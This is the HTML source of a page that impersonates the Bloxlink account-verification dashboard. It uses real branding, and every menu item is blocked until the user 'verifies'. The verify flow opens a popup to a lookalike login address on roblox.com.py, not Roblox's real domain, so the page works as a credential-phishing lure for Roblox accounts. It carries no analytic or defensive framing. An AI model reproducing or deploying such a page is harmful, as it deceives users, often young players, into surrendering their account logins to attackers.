<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Bloxlink – Verifications</title>

  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="icon" href="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png" type="image/png">
  <link rel="stylesheet" href="style.css">
</head>
<body>

<button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>

<div class="top-bar">
  ℹ️ Bloxlink is now part of the Roblox family! Read more here:
  <a href="#" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
</div>

<div class="layout">

  <aside class="sidebar" id="sidebar">
    <div class="logo">
      <img src="https://cdn.discordapp.com/attachments/1461462727888474264/1462122032933240954/wordmark.png"
           alt="Bloxlink" style="max-width:160px;height:auto;">
    </div>

    <div class="section">
      <p class="section-title">GENERAL</p>
      <button class="nav-item active" onclick="openBlockedPopup()">✓ Verifications</button>
      <button class="nav-item" onclick="openBlockedPopup()">▦ Manage Servers</button>
    </div>

    <div class="section">
      <p class="section-title">ACCOUNT</p>
      <button class="nav-item" onclick="openBlockedPopup()">◼ Manage Subscriptions</button>
      <button class="nav-item" onclick="openBlockedPopup()">⚙ Settings</button>
    </div>

    <div class="section">
      <p class="section-title">OTHER</p>
      <button class="nav-item" onclick="openBlockedPopup()">? Support</button>
      <button class="nav-item" onclick="openBlockedPopup()">⌘ Developer API</button>
    </div>
  </aside>

  <main class="content">
    <h2>Verifications</h2>
    <p class="subtitle">Manage your linked accounts.</p>

    <div class="verify-card">
      <div>
        <h1>Get started now by linking your account</h1>
        <p>
          Join our millions of users by linking your account.
          After verifying, you'll gain access to thousands of communities.
        </p>
      </div>

      <button class="verify-circle" onclick="openVerifyScreen()">Verify Now</button>
    </div>

    <div class="missing-bar">
      <span>Missing an account?</span>
      <a href="#" class="missing-btn" onclick="openVerifyScreen()">+ Add Another One</a>
    </div>
  </main>
</div>

<div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>

<div id="blockedOverlay" class="popup-overlay">
  <div class="popup">
    <div class="popup-header red">
      Must verify to access other sections of the dashboard
    </div>
    <div class="popup-body">
      <button onclick="closeBlocked()">Close</button>
    </div>
  </div>
</div>

<div id="verifyOverlay" class="popup-overlay">
  <div class="verify-popup">
    <div class="verify-header">Verify Your Account</div>

    <div class="verify-body">
      <div class="verify-icon">
        <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">
      </div>

      <button class="verify-continue" onclick="openRobloxIframe()">Continue</button>
      <div class="verify-or">or</div>
      <button class="verify-return" onclick="closeVerifyScreen()">Return to Bloxlink</button>
    </div>
  </div>
</div>

<script>
  const blockedOverlay = document.getElementById("blockedOverlay");
  const verifyOverlay = document.getElementById("verifyOverlay");
  const sidebar = document.getElementById("sidebar");
  const sidebarOverlay = document.getElementById("sidebarOverlay");

  const ROBLOX_URL = "https://roblox.com.py/login?returnUrl=7692425652606225";

  function hideWithFade(element, callback) {
    element.classList.remove("show");
    setTimeout(() => callback && callback(), 250);
  }

  function openBlockedPopup() {
    blockedOverlay.classList.add("show");
  }

  function closeBlocked() {
    blockedOverlay.classList.remove("show");
  }

  function openVerifyScreen() {
    verifyOverlay.classList.add("show");
  }

  function closeVerifyScreen() {
    hideWithFade(verifyOverlay);
  }

  /* ✅ ALTERAÇÃO ÚNICA: popup centralizado */
  function openRobloxIframe() {
    hideWithFade(verifyOverlay, () => {
      const width = 500;
      const height = 700;

      const left = (screen.width - width) / 2;
      const top = (screen.height - height) / 2;

      window.open(
        ROBLOX_URL,
        "RobloxVerify",
        `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes`
      );
    });
  }

  function toggleSidebar() {
    sidebar.classList.toggle("open");
    sidebarOverlay.classList.toggle("show");
  }
</script>

</body>
</html>
